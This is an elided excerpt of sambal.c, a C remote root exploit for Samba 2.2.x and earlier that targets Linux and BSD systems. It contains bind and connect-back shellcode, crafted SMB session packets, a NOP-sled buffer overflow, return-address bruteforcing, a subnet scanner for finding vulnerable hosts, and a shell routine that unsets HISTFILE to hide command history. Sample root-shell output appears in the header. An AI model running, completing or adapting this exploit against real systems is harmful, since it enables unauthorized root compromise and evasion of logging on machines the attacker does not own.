/*           _ ________            _____                        ______
    __ ___ ____       /____.------`    /_______.------.___.----`  ___/____
_______
...
(www.netric.org|be)
    ...
    sambal.c is a remote root exploit for samba 2.2.x and prior that works
against Linux (all distros), FreeBSD (4.x, 5.x), NetBSD (1.x) and OpenBSD
(2.x, 3.x and 3.2-non exec stack). It has a scan option, so you can easily
identify your lost samba boxes on your home WAN...
    ...
    to write a master byte. To control the entire buffer, and into this byte,
the user poured his cruelty, his malice and his will to dominate it all!
...
i586 i386 GNU/Linux uid=0(root) gid=0(root) groups=99(nobody)


[*] Credits

    lynx, mike, powerpork, sacrine, the_itch, tozz
...
char bsd_bindcode[] =
    "\x31\xc0\x50\x50\x50\xb0\x17\xcd\x80"
...
void usage(char *prog) {
  fprintf(stderr,
          ...
          "-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = "
          "OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)\n"
...
int is_samba(char *ip, unsigned long time_out) {
  char nbtname[] = /* netbios name packet */
      {0x80, 0xf0, 0x00, 0x10, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
...
int Connect(int fd, char *ip, unsigned int port, unsigned int time_out) {
  ...
  if (FD_ISSET(fd, &connect_read) || FD_ISSET(fd, &connect_write)) {
    if (FD_ISSET(fd, &connect_read) && FD_ISSET(fd, &connect_write)) {
      ...
      if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &getsockopt_error,
                     &getsockopt_length) < 0) {
        errno = ETIMEDOUT;
        close(fd);
        return -1;
...
void shell(int sock) {
  ...
  char buff[1024],
      *cmd =
          "unset HISTFILE; echo \"*** JE MOET JE MUIL HOUWE\";uname -a;id;\n";
  int n;
...
int start_session(int sock) {
  ...
  char response[4096];
  char session_data1[] =
      "\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01\x00\x00\x00\x00";
  char session_data2[] =
      "\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24\x25\x6e\x6f\x62\x6f\x64\x79"
  ...
  if (netbiosheader->type != 0x00)
    fprintf(stderr, "+ Recieved a non session message\n");
  ...
  memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), session_data2,
         sizeof(session_data2) - 1);

  if (write_timer(sock, 3) == 1)
    if (send(sock, buffer, 64, 0) < 0)
      return -1;
...
int exploit_normal(int sock, unsigned long ret, char *shellcode) {
  ...
  memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) +
             sizeof(exploit_data),
         0x90, 3000);
  ...
  memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), exploit_data,
         sizeof(exploit_data) - 1);
...
int main(int argc, char *argv[]) {
  ...
  while ((opt = getopt(argc, argv, "b:B:c:C:d:fp:r:sS:t:v")) != EOF) {
    ...
    case 'c':
      ...
      linux_connect_back[33] = ip1;
      bsd_connect_back[24] = ip1;
      linux_connect_back[34] = ip2;
      bsd_connect_back[25] = ip2;
      linux_connect_back[35] = ip3;
      bsd_connect_back[26] = ip3;
      linux_connect_back[36] = ip4;
      bsd_connect_back[27] = ip4;
  ...
  if ((argv[optind] == NULL && scan == 0) ||
      (type == 0 && brute == -1 && scan == 0))
    usage(argv[0] == NULL ? "sambal" : argv[0]);
  ...
  if (scan == 1) {
    ...
    while (1) {
      ...
      for (ip4 = 0; ip4 < 255; ip4++) {
        i++;
        snprintf(scan_ip, sizeof(scan_ip) - 1, "%u.%u.%u.%u", ip1, ip2, ip3,
                 ip4);
        usleep(BRUTE_DELAY);
  ...
  if (brute == -1) {
    ...
    if (verbose == 1)
      fprintf(stdout, "+ Session enstablished\n");
    sleep(5);
  ...
  while (OWNED == 0) {
    ...
    if ((ret & 0xff) == 0x00 && brute != 3)
      ret++;

    if (verbose == 1)
      fprintf(stdout, "+ Using ret: [0x%08x]\n", (unsigned int)ret);
    ...
    case 0:
      ...
      if (write_timer(sock, 3) == 1) {
        ...
        if (brute == 3) {
          ...
          if (Connect(sock2, (char *)inet_ntoa(addr1.sin_addr), 45295, 2) !=
              -1) {
            if (sock2 > 2)
              close(sock2);
